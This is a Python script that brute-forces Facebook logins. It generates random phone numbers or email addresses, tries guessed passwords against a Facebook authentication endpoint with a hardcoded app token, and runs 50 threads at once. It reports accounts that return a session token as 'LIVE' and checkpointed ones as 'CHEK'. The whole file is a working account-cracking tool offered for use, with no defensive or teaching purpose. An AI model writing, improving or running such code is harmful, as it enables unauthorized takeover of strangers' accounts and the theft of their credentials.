

import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

 Fill in the initial number, bro
  Must be 5 digits or may not be less and may not be more.
  Example: 62877
  ''')
  code=str(input('  Enter the initial number: '))
  exit('  The number must be 5 digits so you cant lose it.') if len(code) < 5 else ''
  exit('  The number must be 5 digits, so not more.') if len(code) > 5 else ''
  number=int(input('''
  Enter the number of numbers to make for example: 10
  total: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(code)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(number)]]
  print('''
  Good luck today :)
  Wait, bro, don't close it....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=50) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Its finished bro')

def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM EMAIL ]

  Fill in the name of the user, kaka
  Example: Princess
  ''')
  name=input('  Username: ')
  domain=input('''
  select domain bro [G]mail, [Y]ahoo, [H]otmail
  select (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Please fill in the correct bro.') if not domain in ['g','y','h'] else ''
  number=int(input('''
Enter the number of e-mails to make. Example: 10
  total: '''))
  setpw=input('''
  Set a password that approaches the user's name
  example: princess123, princess1234
  Set password: ''').split(',')
  [data.append({'user': name+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,number+1)]
  print('''
  Have a good day today :)
  Wait, bro, don't close it...
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=50) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Its finished bro')

def select():
  print('''
  1. Crack from a random number
  2. Crack from random emails
  ''')
  pil=int(input('  Choose which man?: '))
  if pil == 1:
    random_numbers()
  elif pil == 2:
    random_email()
  else:
    exit('  Goback')
 
select() if __name__ == '__main__' else exit('Sorry, somethings wrong please try again later.')
